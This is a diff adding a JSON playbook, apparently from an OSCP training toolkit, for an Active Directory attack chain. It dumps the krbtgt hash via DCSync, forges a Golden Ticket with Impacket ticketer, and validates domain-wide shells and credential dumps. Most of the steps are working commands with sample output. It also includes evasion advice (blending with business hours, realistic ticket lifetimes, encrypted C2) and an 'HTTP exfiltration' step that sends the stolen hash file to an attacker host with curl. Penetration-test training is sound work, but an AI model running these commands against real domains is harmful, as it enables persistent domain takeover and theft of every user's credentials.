@@ -1,0 +1,269 @@
+{
+  "id": "ad-dcsync-golden-ticket",
+  "name": "DCSync to Golden Ticket - Persistent Domain Access Chain",
+  "description": "Advanced attack chain for achieving persistent domain-wide access via Golden Ticket forgery.\n\nExtracts krbtgt account hash using DCSync attack (requires Domain Admin or replication rights), creates forged Kerberos TGT with Impacket ticketer.py, and validates persistent access across the domain. RECOMMENDED for OSCP exam persistence - works from Kali without Windows access.\n\nDETECTION RISK: Medium-High. DCSync triggers replication events (EventID 4662), Golden Ticket usage harder to detect (no AS-REQ to KDC). LIFESPAN: 10 years default (krbtgt password rarely changes).",
+  "version": "1.0.0",
+  "metadata": {
+    "author": "CRACK Development Team - OSCP Track",
+    "created": "2025-11-23",
+    "updated": "2025-11-23",
+    "tags": [
+      "OSCP:HIGH",
+      "ACTIVE_DIRECTORY",
+      "DCSYNC",
+      "GOLDEN_TICKET",
+      "PERSISTENCE",
+      "CREDENTIAL_ACCESS",
+      "KERBEROS",
+      "POST_EXPLOITATION"
+    ],
+    "category": "credential-access",
+    "platform": "active-directory",
+    "references": [
+      "https://attack.mitre.org/techniques/T1003/006/",
+      "https://attack.mitre.org/techniques/T1558/001/",
+      "https://adsecurity.org/?p=1515",
+      "https://github.com/fortra/impacket/blob/master/examples/secretsdump.py",
+      "https://github.com/fortra/impacket/blob/master/examples/ticketer.py"
+    ]
+  },
+  "difficulty": "advanced",
+  "time_estimate": "45 minutes",
+  "oscp_relevant": true,
+  "prerequisites": [
+    "Domain Admin credentials OR Domain User with replication rights (DCSync permissions: DS-Replication-Get-Changes, DS-Replication-Get-Changes-All)",
+    "Network access to Domain Controller on port 445/tcp (SMB) and 135/tcp (RPC)",
+    "Kali Linux system with Impacket suite installed (impacket-secretsdump, impacket-ticketer, impacket-psexec)",
+    "Knowledge of target domain FQDN and Domain SID (can be extracted during DCSync)"
+  ],
+  "notes": "OSCP GOLDEN TICKET STRATEGY: This chain focuses on PERSISTENCE, not initial access. Golden Ticket is the END GAME after obtaining Domain Admin or replication rights. LIFESPAN: Ticket valid for 10 years by default (krbtgt NTLM hash rarely changes - often never). STEALTH: Once created, Golden Ticket allows domain-wide access WITHOUT contacting DC for authentication (no AS-REQ to KDC) - harder to detect than standard Kerberos auth. DETECTION INDICATORS: (1) DCSync phase triggers EventID 4662 (replication request from non-DC), (2) Golden Ticket usage may trigger abnormal TGS-REQ patterns, abnormal ticket lifetimes (10 years vs 10 hours), or tickets for disabled accounts. OPSEC CONSIDERATIONS: (1) Use realistic ticket lifetime (10 hours, not 10 years) to evade detection, (2) Forge ticket for existing user (not disabled/deleted accounts), (3) Execute DCSync during business hours (blend with legitimate replication), (4) Use encrypted C2 channel for hash exfiltration. EXAM TIP: Practice this chain MULTIPLE times - Golden Ticket is common OSCP persistence requirement. Time pressure = 30 minutes under exam stress. ALTERNATIVES: If DCSync unavailable, try (1) NTDS.dit extraction via VSS shadow copy, (2) Credential dumping from compromised DC (Mimikatz sekurlsa::logonpasswords), (3) Kerberoasting Domain Admin accounts. IMPACKET vs MIMIKATZ: Impacket ticketer.py RECOMMENDED for OSCP (runs on Kali, no AV concerns, seamless integration with psexec/wmiexec). Mimikatz requires Windows host and may trigger AV/EDR.",
+  "steps": [
+    {
+      "id": "verify-replication-rights",
+      "name": "Verify DCSync Permissions and Prerequisites",
+      "objective": "Confirm compromised account has replication rights required for DCSync attack",
+      "description": "PREREQUISITES CHECK: DCSync requires Domain Admin OR Domain User with specific replication permissions.\n\nREQUIRED PERMISSIONS:\n(1) DS-Replication-Get-Changes (GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)\n(2) DS-Replication-Get-Changes-All (GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)\n(3) Optional: DS-Replication-Get-Changes-In-Filtered-Set (for RODC environments)\n\nVERIFICATION METHODS:\n\nLINUX (Impacket): Test directly with secretsdump - if successful, rights confirmed.\nimpacket-secretsdump -just-dc-user krbtgt '<DOMAIN>/<USERNAME>:<PASSWORD>@<DC_IP>'\nSUCCESS: Outputs krbtgt NTLM hash → Rights confirmed.\nFAILURE: ERROR_ACCESS_DENIED or rpc_s_access_denied → Insufficient rights.\n\nWINDOWS (PowerView): Get-DomainObjectAcl -Identity \"DC=domain,DC=com\" -ResolveGUIDs | ?{$_.ObjectAceType -match \"Replication\"}\nLook for: Replication-Get-Changes and Replication-Get-Changes-All for compromised user.\n\nCONNECTIVITY TEST: Verify DC reachable on required ports.\nsudo nmap -p 445,135,139 -Pn -v <DC_IP>\nEXPECTED: 445/tcp open (SMB), 135/tcp open (RPC), 139/tcp open (NetBIOS).\n\nOPSEC: Rights verification does NOT trigger alerts - only actual DCSync attempt (step 2) creates Event 4662.\n\nFAILURE SCENARIOS:\n- ERROR_ACCESS_DENIED → Account lacks replication rights (need Domain Admin or add rights manually)\n- Connection timeout → Firewall blocking SMB/RPC ports\n- KRB_AP_ERR_SKEW → Time sync issue (fix: sudo ntpdate <DC_IP>)\n\nTIME ESTIMATE: 2-5 minutes.",
+      "command_ref": "ad-dcsync-check-permissions",
+      "evidence": [
+        "Successful secretsdump test output (krbtgt hash retrieved)",
+        "Network connectivity confirmed to DC on ports 445, 135, 139",
+        "No access denied errors",
+        "Time synchronized within 5 minutes of DC"
+      ],
+      "dependencies": [],
+      "repeatable": true,
+      "success_criteria": [
+        "Account has DS-Replication-Get-Changes and DS-Replication-Get-Changes-All rights",
+        "DC is reachable on SMB (445) and RPC (135) ports",
+        "No Kerberos time skew errors",
+        "Test DCSync succeeds (krbtgt hash retrieved)"
+      ],
+      "failure_conditions": [
+        "ERROR_ACCESS_DENIED (insufficient replication rights)",
+        "rpc_s_access_denied (account lacks permissions)",
+        "Connection timeout (firewall blocking required ports)",
+        "KRB_AP_ERR_SKEW (time synchronization issue - >5 min difference)",
+        "STATUS_LOGON_FAILURE (invalid credentials)"
+      ],
+      "next_steps": [
+        "dcsync-krbtgt-hash"
+      ]
+    },
+    {
+      "id": "dcsync-krbtgt-hash",
+      "name": "Extract krbtgt Account Hash via DCSync",
+      "objective": "Use DCSync attack to extract krbtgt account NTLM hash and Domain SID for Golden Ticket creation",
+      "description": "KRBTGT ACCOUNT: Special domain account used to sign all Kerberos TGTs. Compromising krbtgt hash = ability to forge any Kerberos ticket for any user (including Domain Admin, Enterprise Admin, disabled accounts).\n\nDCSYNC COMMAND (Impacket - RECOMMENDED):\nimpacket-secretsdump -just-dc-user krbtgt '<DOMAIN>/<USERNAME>:<PASSWORD>@<DC_IP>'\n\nFlags explained:\n-just-dc-user krbtgt: Extract ONLY krbtgt account (faster, less noisy than full dump)\n-outputfile: Optional - save to file for transfer/backup\n\nALTERNATIVE (Mimikatz on Windows):\nlsadump::dcsync /domain:<DOMAIN> /user:krbtgt\n\nOUTPUT ANALYSIS:\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:a9b30e5b0dc865eadcea9411e4ade72d:::\n         ^^^ RID                                 ^^^ NTLM hash (THIS IS GOLDEN TICKET KEY)\n\nDOMAIN SID EXTRACTION: Look for line like:\n[*] Domain SID: S-1-5-21-1234567890-1234567890-1234567890\n                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ Save this - required for Golden Ticket\n\nCRITICAL: Document BOTH values:\n(1) krbtgt NTLM hash: a9b30e5b0dc865eadcea9411e4ade72d\n(2) Domain SID: S-1-5-21-1234567890-1234567890-1234567890\n\nOPSEC CONSIDERATIONS:\n- DCSync generates EventID 4662 on DC (Object Access - Replication Activity)\n- Replication from non-DC system is HIGHLY suspicious\n- BLUE TEAM DETECTION: Replication request from workstation IP, not DC IP\n- TIMING: Execute during business hours (0900-1700) to blend with legitimate admin activity\n- ALTERNATIVE: If stealth critical, extract NTDS.dit via VSS shadow copy instead (different detection signature)\n\nFAILURE SCENARIOS:\n- ERROR_DS_DRA_ACCESS_DENIED → Account lacks replication rights (return to step 1)\n- krbtgt account not found → Wrong domain name specified\n- Connection lost → Network instability or IDS/IPS blocking\n\nTIME ESTIMATE: 10-30 seconds (single user extraction is fast).",
+      "command_ref": "ad-dcsync-impacket-secretsdump-user",
+      "evidence": [
+        "krbtgt NTLM hash extracted (32 hex characters)",
+        "Domain SID extracted (format: S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX)",
+        "secretsdump output saved to file",
+        "No access denied or permission errors"
+      ],
+      "dependencies": [
+        "verify-replication-rights"
+      ],
+      "repeatable": true,
+      "success_criteria": [
+        "krbtgt NTLM hash successfully extracted (32 character hex string)",
+        "Domain SID identified and documented",
+        "No errors during DCSync operation",
+        "Hash and SID saved for Golden Ticket creation"
+      ],
+      "failure_conditions": [
+        "ERROR_DS_DRA_ACCESS_DENIED (replication rights issue)",
+        "User not found (wrong username or domain)",
+        "Connection timeout (network or firewall issue)",
+        "KRB_AP_ERR_MODIFIED (integrity check failed - possible IDS tampering)"
+      ],
+      "next_steps": [
+        "transfer-hashes-to-kali",
+        "create-golden-ticket"
+      ]
+    },
+    {
+      "id": "transfer-hashes-to-kali",
+      "name": "Transfer Hashes to Kali (If Extracted on Windows)",
+      "objective": "Move DCSync output from Windows system to Kali Linux for Golden Ticket creation with Impacket",
+      "description": "SKIP IF: DCSync executed on Kali Linux directly (impacket-secretsdump).\nProceed directly to step 4 (create-golden-ticket).\n\nREQUIRED IF: DCSync executed on compromised Windows system (Mimikatz lsadump::dcsync).\nMust transfer krbtgt hash and Domain SID to Kali for ticketer.py.\n\nFILE TO TRANSFER: Save DCSync output to text file:\nC:\\\\temp\\\\krbtgt_hash.txt containing:\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:a9b30e5b0dc865eadcea9411e4ade72d:::\nDomain SID: S-1-5-21-1234567890-1234567890-1234567890\n\nTRANSFER METHODS:\n\n(1) IMPACKET SMB SERVER (RECOMMENDED):\nKali: sudo impacket-smbserver -smb2support -username transfer -password 'TransferPass123!' share /home/kali/loot\nWindows: net use \\\\\\\\<KALI_IP>\\\\share /user:transfer TransferPass123!\n         copy C:\\\\temp\\\\krbtgt_hash.txt \\\\\\\\<KALI_IP>\\\\share\\\nWindows: net use \\\\\\\\<KALI_IP>\\\\share /delete\n\n(2) BASE64 ENCODE (No SMB connectivity):\nWindows: certutil -encode C:\\\\temp\\\\krbtgt_hash.txt C:\\\\temp\\\\hash.b64\n         type C:\\\\temp\\\\hash.b64\nCopy output, paste on Kali:\nKali: cat > hash.b64 << 'EOF'\n<paste Base64 content>\nEOF\nbase64 -d hash.b64 > krbtgt_hash.txt\n\n(3) HTTP EXFILTRATION:\nKali: python3 -m http.server 8000 (setup simple HTTP server)\nWindows: curl http://<KALI_IP>:8000/upload -F \"file=@C:\\\\temp\\\\krbtgt_hash.txt\" -X POST\nOR: Invoke-WebRequest -Uri http://<KALI_IP>:8000 -Method POST -InFile C:\\\\temp\\\\krbtgt_hash.txt\n\n(4) MANUAL COPY (Last resort):\nCopy hash and SID manually via RDP clipboard, terminal copy/paste.\n\nVALIDATION: Verify file integrity on Kali:\ncat krbtgt_hash.txt\nConfirm: NTLM hash (32 hex chars) and Domain SID present.\n\nOPSEC: SMB server method creates network traffic. Use encrypted channel if IDS/IPS monitoring active.\n\nTIME ESTIMATE: 1-2 minutes.",
+      "command_ref": "impacket-smbserver",
+      "evidence": [
+        "krbtgt hash and Domain SID file present on Kali",
+        "File integrity verified (hash and SID readable)",
+        "No corruption during transfer",
+        "Original hash values match transferred values"
+      ],
+      "dependencies": [
+        "dcsync-krbtgt-hash"
+      ],
+      "repeatable": true,
+      "success_criteria": [
+        "DCSync output successfully transferred to Kali",
+        "File contains valid krbtgt NTLM hash (32 hex characters)",
+        "File contains valid Domain SID (S-1-5-21-...)",
+        "No data corruption during transfer"
+      ],
+      "failure_conditions": [
+        "SMB connection refused (firewall blocking port 445)",
+        "Authentication failed to SMB server (wrong credentials)",
+        "File corrupted during transfer (hash format invalid)",
+        "Base64 decode errors (incomplete copy/paste)"
+      ],
+      "next_steps": [
+        "create-golden-ticket"
+      ]
+    },
+    {
+      "id": "create-golden-ticket",
+      "name": "Forge Golden Ticket with Impacket ticketer.py",
+      "objective": "Create forged Kerberos TGT using krbtgt NTLM hash for persistent domain-wide access",
+      "description": "GOLDEN TICKET THEORY: Normal Kerberos auth: User requests TGT from KDC (signed with krbtgt hash) → User presents TGT to request service tickets. Golden Ticket: Attacker creates FAKE TGT signed with stolen krbtgt hash → Domain trusts ticket (valid signature) → No KDC contact needed → Access any service as any user.\n\nIMPACKET TICKETER COMMAND:\nimpacket-ticketer -nthash <KRBTGT_NTLM> -domain-sid <DOMAIN_SID> -domain <DOMAIN_FQDN> <USERNAME>\n\nPARAMETERS:\n-nthash: krbtgt NTLM hash from step 2 (32 hex characters)\n-domain-sid: Domain SID from step 2 (S-1-5-21-...)\n-domain: Target domain FQDN (e.g., corp.com)\n<USERNAME>: User to impersonate (e.g., Administrator, Domain Admin username)\n\nOPTIONAL FLAGS (Advanced OPSEC):\n-duration <HOURS>: Ticket lifetime (default: 87600 hours = 10 years). Use realistic value for stealth: 10 hours.\n-user-id <RID>: User RID (default: 500 = Administrator). Match real user RID for stealth.\n-groups <RIDS>: Group memberships (default: 512,513,518,519,520 = Domain Admins, Domain Users, Schema Admins, Enterprise Admins, Group Policy Admins).\n\nEXAMPLE (Realistic OPSEC-aware ticket):\nimpacket-ticketer -nthash a9b30e5b0dc865eadcea9411e4ade72d -domain-sid S-1-5-21-1234567890-1234567890-1234567890 -domain corp.com -duration 10 -user-id 1104 Dave\n\nOUTPUT:\n[*] Creating basic skeleton ticket and PAC Infos\n[*] Customizing ticket for corp.com/Dave\n[*] Signing/Encrypting final ticket\n[*]   PAC_LOGON_INFO\n[*]   EncTicketPart\n[*] Saving ticket in Dave.ccache\n          ^^^ OUTPUT FILE (Kerberos credential cache)\n\nCRITICAL: ticketer.py creates .ccache file (e.g., Administrator.ccache, Dave.ccache).\nThis file contains the forged TGT.\n\nOPSEC STEALTH TECHNIQUES:\n(1) Impersonate EXISTING user (not disabled/deleted accounts) - query with: net user /domain OR ldapsearch\n(2) Use realistic ticket lifetime (10 hours, not 10 years) - matches domain policy\n(3) Match real user RID - extract with: rpcclient -U \"user%pass\" -c \"lookupnames username\" <DC_IP>\n(4) Forge ticket for standard user FIRST (test), then escalate to Domain Admin if detected\n\nDETECTION INDICATORS (Blue Team perspective):\n- TGT lifetime exceeds domain policy maximum (e.g., 10 years vs 10 hours)\n- TGT for disabled/deleted user accounts\n- TGT with unusual group memberships (e.g., all admin groups)\n- TGT issued outside of DC issuing patterns\n\nTIME ESTIMATE: 5-10 seconds (ticket creation is instant).",
+      "command_ref": "ad-golden-ticket-ticketer-create",
+      "evidence": [
+        "Golden Ticket .ccache file created (e.g., Administrator.ccache)",
+        "File size >1KB (valid ticket data)",
+        "ticketer.py output shows successful signing/encryption",
+        "No errors during ticket creation"
+      ],
+      "dependencies": [
+        "transfer-hashes-to-kali"
+      ],
+      "repeatable": true,
+      "success_criteria": [
+        "ticketer.py executes without errors",
+        ".ccache file created successfully",
+        "Ticket contains correct domain, username, and SID",
+        "Ticket file is valid Kerberos credential cache format"
+      ],
+      "failure_conditions": [
+        "Invalid NTLM hash format (must be 32 hex characters)",
+        "Invalid Domain SID format (must be S-1-5-21-...)",
+        "Missing required parameters (-nthash, -domain-sid, -domain)",
+        "File write permission denied (cannot create .ccache file)"
+      ],
+      "next_steps": [
+        "export-ticket-to-environment"
+      ]
+    },
+    {
+      "id": "export-ticket-to-environment",
+      "name": "Export Golden Ticket to Kerberos Environment",
+      "objective": "Load forged TGT into Kerberos credential cache for use with Impacket tools",
+      "description": "KERBEROS CREDENTIAL CACHE: Linux Kerberos uses credential cache (ccache) to store TGTs/TGS tickets. Impacket tools (psexec, wmiexec, smbexec, secretsdump) check KRB5CCNAME environment variable for ticket location.\n\nEXPORT COMMAND:\nexport KRB5CCNAME=/path/to/<USERNAME>.ccache\n\nEXAMPLE:\nexport KRB5CCNAME=/home/kali/loot/Administrator.ccache\n\nVERIFY EXPORT:\necho $KRB5CCNAME\nOUTPUT: /home/kali/loot/Administrator.ccache\n\nVIEW TICKET DETAILS (Optional verification):\nklist\nOUTPUT:\nTicket cache: FILE:/home/kali/loot/Administrator.ccache\nDefault principal: Administrator@CORP.COM\n\nValid starting       Expires              Service principal\n11/23/2025 10:00:00  11/23/2025 20:00:00  krbtgt/CORP.COM@CORP.COM\n^^^ Ticket valid     ^^^ Expiration        ^^^ Service (krbtgt = TGT)\n\nIMPORTANT: KRB5CCNAME is SESSION-SPECIFIC.\nIf you open new terminal, must re-export.\nOR: Add to ~/.bashrc for persistence: echo 'export KRB5CCNAME=/path/to/ticket.ccache' >> ~/.bashrc\n\nALTERNATIVE METHODS:\n\n(1) Copy to default ccache location:\ncp Administrator.ccache /tmp/krb5cc_$(id -u)\nexport KRB5CCNAME=/tmp/krb5cc_$(id -u)\n\n(2) Use -k flag directly (some Impacket tools):\nimpacket-psexec -k -no-pass corp.com/Administrator@DC01.corp.com\n(Note: Still requires KRB5CCNAME set OR ticket in default location)\n\nKERBEROS CONFIGURATION: Some environments require /etc/krb5.conf configuration:\n[libdefaults]\n    default_realm = CORP.COM\n    dns_lookup_kdc = true\n    dns_lookup_realm = false\n\n[realms]\n    CORP.COM = {\n        kdc = dc01.corp.com\n        admin_server = dc01.corp.com\n    }\n\nEdit if klist or Impacket tools show \"KDC not found\" errors.\n\nTIME ESTIMATE: 30 seconds.",
+      "command_ref": "ad-golden-ticket-ticketer-create",
+      "evidence": [
+        "KRB5CCNAME environment variable set correctly",
+        "echo $KRB5CCNAME shows correct .ccache file path",
+        "klist command shows valid TGT for target user",
+        "Ticket expiration time matches expected duration"
+      ],
+      "dependencies": [
+        "create-golden-ticket"
+      ],
+      "repeatable": true,
+      "success_criteria": [
+        "KRB5CCNAME environment variable exported successfully",
+        "Variable points to valid .ccache file",
+        "klist shows ticket is loaded and valid",
+        "Ticket principal matches forged username and domain"
+      ],
+      "failure_conditions": [
+        "KRB5CCNAME not set (echo returns empty)",
+        "klist shows 'No credentials cache found' (wrong path)",
+        "klist shows 'Ticket cache is empty' (invalid .ccache file)",
+        "Permission denied reading .ccache file (chmod 600 required)"
+      ],
+      "next_steps": [
+        "validate-golden-ticket-access"
+      ]
+    },
+    {
+      "id": "validate-golden-ticket-access",
+      "name": "Validate Golden Ticket with Impacket Tools",
+      "objective": "Confirm Golden Ticket works by authenticating to domain resources and executing commands as forged user",
+      "description": "VALIDATION STRATEGY: Test Golden Ticket against multiple domain resources to confirm ticket validity and domain-wide access.\n\nTEST 1: SECRETSDUMP (Domain credential dump - requires Domain Admin rights)\nimpacket-secretsdump -k -no-pass '<DOMAIN>/<USERNAME>@<DC_FQDN>'\n\nFlags:\n-k: Use Kerberos authentication (reads ticket from KRB5CCNAME)\n-no-pass: Don't prompt for password (using ticket auth)\n<DC_FQDN>: MUST be FQDN (dc01.corp.com), not IP (Kerberos requires hostnames)\n\nSUCCESS OUTPUT:\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:...\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:...\n<hundreds of domain user hashes>\n\nTEST 2: PSEXEC (Interactive SYSTEM shell on DC)\nimpacket-psexec -k -no-pass '<DOMAIN>/<USERNAME>@<DC_FQDN>'\n\nSUCCESS: Drops to C:\\\\Windows\\\\system32> prompt with SYSTEM privileges.\nTest: whoami → nt authority\\\\system\n      hostname → DC01\n\nTEST 3: WMIEXEC (Stealthy semi-interactive shell)\nimpacket-wmiexec -k -no-pass '<DOMAIN>/<USERNAME>@<DC_FQDN>'\n\nSUCCESS: Drops to [*] SMB shell prompt.\nTest: whoami → corp\\\\administrator (runs as user, not SYSTEM)\n\nTEST 4: SMBCLIENT (Access domain shares)\nimpacket-smbclient -k -no-pass '<DOMAIN>/<USERNAME>@<DC_FQDN>'\n\nSUCCESS: Lists shares (ADMIN$, C$, IPC$, NETLOGON, SYSVOL).\nTest: use ADMIN$; ls (confirms admin access to C:\\\\Windows)\n\nCRITICAL NOTES:\n- Golden Ticket auth = NO PASSWORD NEEDED (ticket proves identity)\n- MUST use FQDNs for targets (dc01.corp.com), not IPs - Kerberos requires DNS names\n- Ticket allows access to ANY domain resource as forged user (DCs, member servers, workstations)\n- Access persists until ticket expiration (10 hours to 10 years depending on -duration parameter)\n\nFAILURE SCENARIOS:\n- KDC_ERR_TGT_REVOKED: Ticket revoked (krbtgt password changed - rare)\n- KRB_AP_ERR_SKEW: Time sync issue (ntpdate <DC_IP>)\n- Connection timeout: Network/firewall issue (not auth failure)\n- Access denied after successful auth: User lacks permissions (forged wrong user)\n\nPERSISTENCE CONFIRMATION: If ALL tests succeed, Golden Ticket is fully functional.\nSave .ccache file for future access (ticket valid until expiration or krbtgt password reset).\n\nTIME ESTIMATE: 3-5 minutes (all validation tests).",
+      "command_ref": "ad-pass-the-hash-impacket-psexec",
+      "evidence": [
+        "secretsdump successfully dumps domain credentials",
+        "psexec provides SYSTEM shell on DC",
+        "wmiexec provides interactive shell",
+        "smbclient accesses domain shares (ADMIN$, C$, SYSVOL)",
+        "No authentication errors (only network/permission errors possible)"
+      ],
+      "dependencies": [
+        "export-ticket-to-environment"
+      ],
+      "repeatable": true,
+      "success_criteria": [
+        "At least one Impacket tool authenticates successfully using Golden Ticket",
+        "Kerberos authentication succeeds (no password required)",
+        "Access to domain resources confirmed (DC, shares, services)",
+        "Commands execute with forged user's privileges"
+      ],
+      "failure_conditions": [
+        "KDC_ERR_TGT_REVOKED (krbtgt password changed - ticket invalidated)",
+        "KRB_AP_ERR_SKEW (time synchronization issue)",
+        "KRB_AP_ERR_MODIFIED (ticket tampering detected or invalid signature)",
+        "Hostname resolution failed (must use FQDN, not IP)",
+        "KRB5CCNAME not set (ticket not loaded)"
+      ],
+      "next_steps": [
+        "assess-domain-wide-access"
+      ]
+    },
+    {
+      "id": "assess-domain-wide-access",
+      "name": "Assess Domain-Wide Access and Document Persistence",
+      "objective": "Verify Golden Ticket provides comprehensive domain access and document persistent access mechanisms",
+      "description": "DOMAIN-WIDE ACCESS TESTING: Golden Ticket should grant access to ALL domain resources as the forged user. Systematically test and document access scope.\n\nACCESS ASSESSMENT CHECKLIST:\n\n(1) DOMAIN CONTROLLERS:\nTest: impacket-psexec -k -no-pass 'corp.com/Administrator@DC01.corp.com'\nTest: impacket-psexec -k -no-pass 'corp.com/Administrator@DC02.corp.com'\nExpected: SYSTEM shell on all DCs (full domain control)\n\n(2) MEMBER SERVERS (File servers, application servers):\nEnumerate: crackmapexec smb 192.168.50.0/24 -k --kdcHost DC01.corp.com\nIdentify domain-joined systems, test access with Golden Ticket.\n\n(3) DOMAIN SHARES:\nTest: smbclient -k -no-pass '//DC01.corp.com/SYSVOL'\nTest: smbclient -k -no-pass '//DC01.corp.com/NETLOGON'\nTest: smbclient -k -no-pass '//FileServer01.corp.com/SharedData'\nExpected: Full read/write access to domain shares\n\n(4) ADDITIONAL DCSYNC (Persistence validation):\nTest: impacket-secretsdump -k -no-pass 'corp.com/Administrator@DC01.corp.com' -just-dc-ntlm\nExpected: Ability to re-extract ALL domain credentials (confirming Domain Admin level access)\n\n(5) LATERAL MOVEMENT:\nTest: impacket-wmiexec -k -no-pass 'corp.com/Administrator@Workstation01.corp.com'\nTest: impacket-wmiexec -k -no-pass 'corp.com/Administrator@SQLServer.corp.com'\nExpected: Shell access on any domain-joined system\n\nPERSISTENCE DOCUMENTATION:\n\nSAVE GOLDEN TICKET COMPONENTS:\n(1) krbtgt NTLM hash: [document hash]\n(2) Domain SID: [document SID]\n(3) Domain FQDN: [document domain]\n(4) .ccache file: Copy to secure backup location\n    cp Administrator.ccache /home/kali/persistence/corp_golden_ticket_$(date +%Y%m%d).ccache\n\nRE-ACCESS PROCEDURE (Future use):\n(1) Set environment: export KRB5CCNAME=/path/to/backup.ccache\n(2) Verify ticket: klist (check expiration)\n(3) Use Impacket tools with -k -no-pass flags\n(4) If expired: Regenerate with saved hash/SID using ticketer.py\n\nTICKET REGENERATION (If expired or lost):\nimpacket-ticketer -nthash <SAVED_HASH> -domain-sid <SAVED_SID> -domain <DOMAIN> -duration 10 Administrator\nexport KRB5CCNAME=Administrator.ccache\n\nTICKET LIFETIME:\n- Current ticket valid until: [check klist output]\n- Maximum validity: 10 years (if -duration not specified) OR until krbtgt password reset\n- krbtgt password change frequency: Typically NEVER in most orgs (only after major breach or policy mandate)\n- Re-generation: Possible indefinitely as long as krbtgt hash unchanged\n\nDETECTION EVASION:\n- Avoid excessive Golden Ticket use (every auth generates logs)\n- Blend with normal admin activity (execute during business hours)\n- Use realistic ticket parameters (10 hour lifetime, real user RID)\n- Rotate between different forged users if multiple compromised\n\nEXAM NOTES: Document Golden Ticket creation timestamp, components, and access scope in exam report. Include:\n(1) krbtgt hash extraction method (DCSync command)\n(2) Golden Ticket creation command (ticketer.py)\n(3) Validation commands (psexec, secretsdump)\n(4) Screenshot of domain-wide access (e.g., secretsdump output showing all domain hashes)\n\nTIME ESTIMATE: 5-10 minutes (comprehensive testing and documentation).",
+      "command_ref": "crackmapexec-validate-admin",
+      "evidence": [
+        "Access confirmed to multiple domain controllers",
+        "Access confirmed to member servers and workstations",
+        "Domain shares accessible (SYSVOL, NETLOGON, file shares)",
+        "Ability to re-execute DCSync confirmed (Domain Admin privileges)",
+        "Golden Ticket components documented and backed up",
+        "Re-access procedure documented for exam report"
+      ],
+      "dependencies": [
+        "validate-golden-ticket-access"
+      ],
+      "repeatable": true,
+      "success_criteria": [
+        "Domain-wide access confirmed across multiple resource types",
+        "Golden Ticket provides Domain Admin equivalent privileges",
+        "Ticket components backed up securely",
+        "Re-access procedure documented and tested",
+        "Persistence mechanism fully functional and documented"
+      ],
+      "failure_conditions": [
+        "Access denied to some resources (insufficient privileges - wrong user forged)",
+        "Ticket expired before testing completed (re-generate with longer duration)",
+        "krbtgt password changed (ticket invalidated - must re-compromise)",
+        "Network connectivity issues (not authentication failures)"
+      ],
+      "next_steps": []
+    }
+  ]
+}
